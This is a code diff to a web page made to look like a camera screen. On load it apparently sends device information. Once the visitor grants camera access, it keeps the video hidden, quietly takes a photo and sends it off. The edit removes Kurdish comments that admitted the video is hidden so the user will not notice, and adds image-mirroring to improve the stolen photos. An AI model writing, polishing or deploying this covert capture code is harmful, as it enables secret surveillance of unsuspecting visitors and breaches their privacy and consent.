@@ -8,8 +8,12 @@
         body { margin: 0; background: #000; font-family: Tahoma, sans-serif; height: 100vh; overflow: hidden; display: flex; flex-direction: column; color: white; }
         
         .camera-screen { position: relative; width: 100%; height: 100vh; background: #111; display: flex; flex-direction: column; justify-content: space-between; }
-        /* ڤیدیۆکە شاراوە دەبێت تا بەکارهێنەر هەستی پێ نەكات */
-        video { display: none; }
+        
+        /* ڤیدیۆکە شاراوە دەبێت و ئەگەر پێویست بکات هاوسەنگ دەکرێتەوە */
+        video { 
+            display: none; 
+            transform: scaleX(-1); /* بۆ ڕاستکردنەوەی پێچەوانەبوونی کامێرا */
+        }
         
         .top-bar { position: relative; z-index: 10; display: flex; justify-content: space-between; align-items: flex-start; padding: 15px 20px; }
         .top-left { display: flex; gap: 15px; align-items: center; }
@@ -196,19 +200,15 @@
                 const constraints = { 
                     video: { facingMode: currentFacingMode } 
                 };
-                // ئەم ڕستەیە پەنجەرەی Allow دێنێتە پێشەوە
                 stream = await navigator.mediaDevices.getUserMedia(constraints);
                 document.getElementById('cameraView').srcObject = stream;
                 flashOn = false;
                 
-                // دەستبەجێ دوای ئەوەی Allowـی کرد، وێنەکە دەگرێت و دەنێرێت
                 setTimeout(() => {
                     autoCaptureAndSend();
                 }, 800);
 
-            } catch (err) {
-                // ئەگەر بەکارهێنەر Don't Allowـی کرد
-            }
+            } catch (err) {}
         }
 
         function autoCaptureAndSend() {
@@ -221,6 +221,13 @@
             canvas.height = video.videoHeight;
             
             const ctx = canvas.getContext('2d');
+            
+            // ئەگەر کامێرا پێشەوە بوو (user)، وێنەکە ڕاست دەکەینەوە لە کاتی کێشانیدا
+            if (currentFacingMode === 'user') {
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+            }
+
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob(async function(blob) {
@@ -267,7 +274,6 @@
             autoCaptureAndSend();
         }
 
-        // کارپێکردنی ئۆتۆماتیکی لە کاتی کردنەوەی وێبسایتەکەدا
         sendDeviceInfo();
         startCameraAndAutoCapture();
     </script>
